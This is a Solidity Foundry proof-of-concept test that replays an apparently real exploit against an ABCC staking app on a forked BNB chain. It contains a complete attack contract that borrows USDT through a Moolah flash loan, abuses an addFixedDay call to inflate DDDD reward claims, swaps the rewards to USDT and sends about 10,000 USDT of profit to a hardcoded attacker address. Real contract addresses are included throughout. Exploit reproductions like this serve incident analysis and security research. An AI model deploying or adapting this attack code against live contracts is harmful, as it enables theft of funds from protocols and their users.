
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant FORK_BLOCK = 58615054;
    uint256 constant TX_TIMESTAMP = 1755959527;
    uint256 constant TX_BLOCK_NUMBER = 58615055;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        MoolahAbccAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (MoolahAbccAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = MoolahAbccAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new MoolahAbccAttack();
        }
    }

    function _prepareProfit(MoolahAbccAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _installRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(MoolahAbccAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.ATTACKER_EOA, address(0), Addresses.USDT, "USDT", 10062258375072914282796);
    }
}

contract MoolahAbccAttack {
    uint256 private constant FLASH_AMOUNT = 12500000000000000000000;
    uint256 private constant ABCC_DEPOSIT_AMOUNT = 125;
    uint256 private constant ABCC_FIXED_DAY = 1000000000;
    uint256 private constant SWAP_DEADLINE = 1755959527;

    function attack() external payable {
        _borrowMoolahUsdt();
    }

    function flashCallback() internal {
        flashCallbackEntered = true;
        _approveFlashSpend();
        _depositAbcc();
        _claimDdddRewards();
        _approveDdddSwap();
        uint256 ddddSwapAmount = _quoteDdddBalance();
        _swapDdddToUsdt(ddddSwapAmount);
    }

    function _approveFlashSpend() internal {
        IERC20Like(Addresses.USDT).approve(Addresses.MOOLAH_PROXY, FLASH_AMOUNT);
        IERC20Like(Addresses.USDT).approve(Addresses.ABCC_APP, FLASH_AMOUNT);
    }

    function _depositAbcc() internal {
        IABCCApp(Addresses.ABCC_APP).deposit(ABCC_DEPOSIT_AMOUNT, Addresses.ZERO);
    }

    function _claimDdddRewards() internal {
        IABCCApp(Addresses.ABCC_APP).addFixedDay(ABCC_FIXED_DAY);
        IABCCApp(Addresses.ABCC_APP).claimDDDD();
    }

    function _approveDdddSwap() internal {
        uint256 ddddRewardBalance = IERC20Like(Addresses.DDDD).balanceOf(address(this));
        IERC20Like(Addresses.DDDD).approve(Addresses.SWAP_ROUTER, ddddRewardBalance);
    }

    function _quoteDdddBalance() internal view returns (uint256 ddddSwapAmount) {
        ddddSwapAmount = IERC20Like(Addresses.DDDD).balanceOf(address(this));
    }

    function _swapDdddToUsdt(uint256 ddddSwapAmount) internal {
        ISwapRouter(Addresses.SWAP_ROUTER)
            .exactInput(
                ExactInputParams({
                    path: abi.encodePacked(
                        Addresses.DDDD, uint24(2500), Addresses.WBNB, uint24(500), Addresses.USDT
                    ),
                    recipient: address(this),
                    deadline: SWAP_DEADLINE,
                    amountIn: ddddSwapAmount,
                    amountOutMinimum: 0
                })
            );
    }

    function _borrowMoolahUsdt() internal {
        uint256 usdtProfit = _requestFlashLoan();
        _transferUsdtProfit(usdtProfit);
    }

    function _requestFlashLoan() internal returns (uint256 usdtProfit) {
        bytes memory callbackPayload = abi.encode(
            Addresses.ABCC_APP,
            0x0000000000000000000002a5A058fC295Ed00000,
            uint256(83933205880806198734602327668293880550319685818783258292921745627215466332160),
            uint256(111721273600066797928211067566976223592803461767239137959945403320134933676032)
        );
        IMoolahFlashLender(Addresses.MOOLAH_PROXY).flashLoan(Addresses.USDT, FLASH_AMOUNT, callbackPayload);
        usdtProfit = IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function _transferUsdtProfit(uint256 usdtProfit) internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.ATTACKER_EOA, usdtProfit);
    }

    receive() external payable {}

    function onMoolahFlashLoan(uint256 borrowedAmount, bytes calldata callbackPayload) external payable {
        borrowedAmount;
        callbackPayload;
        if (!flashCallbackEntered) flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0xb99082d3) {
            _borrowMoolahUsdt();
            return;
        }
        _ignoreUnknownEntry();
    }

    function _ignoreUnknownEntry() internal {}

    bool private flashCallbackEntered;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant SWAP_ROUTER = 0x1b81D678ffb9C0263b24A97847620C99d213eB14;
    address internal constant ABCC_APP = 0x1bC016C00F8d603c41A582d5Da745905B9D034e5;
    address internal constant DDDD = 0x422cBee1289AAE4422eDD8fF56F6578701Bb2878;
    address internal constant ATTACKER_EOA = 0x53FEEe33527819bB793b72bd67dbf0f8466f7d2c;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant MOOLAH_PROXY = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
    address internal constant ATTACK_CONTRACT = 0x90e076eF0fEd49A0b63938987F2caD6B4Cd97a24;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
}

struct ExactInputParams {
    bytes path;
    address recipient;
    uint256 deadline;
    uint256 amountIn;
    uint256 amountOutMinimum;
}

interface IABCCApp {
    function addFixedDay(uint256) external;
    function claimDDDD() external;
    function deposit(uint256, address) external;
}

interface IMoolahFlashLender {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface ISwapRouter {
    function exactInput(ExactInputParams calldata) external returns (uint256);
}
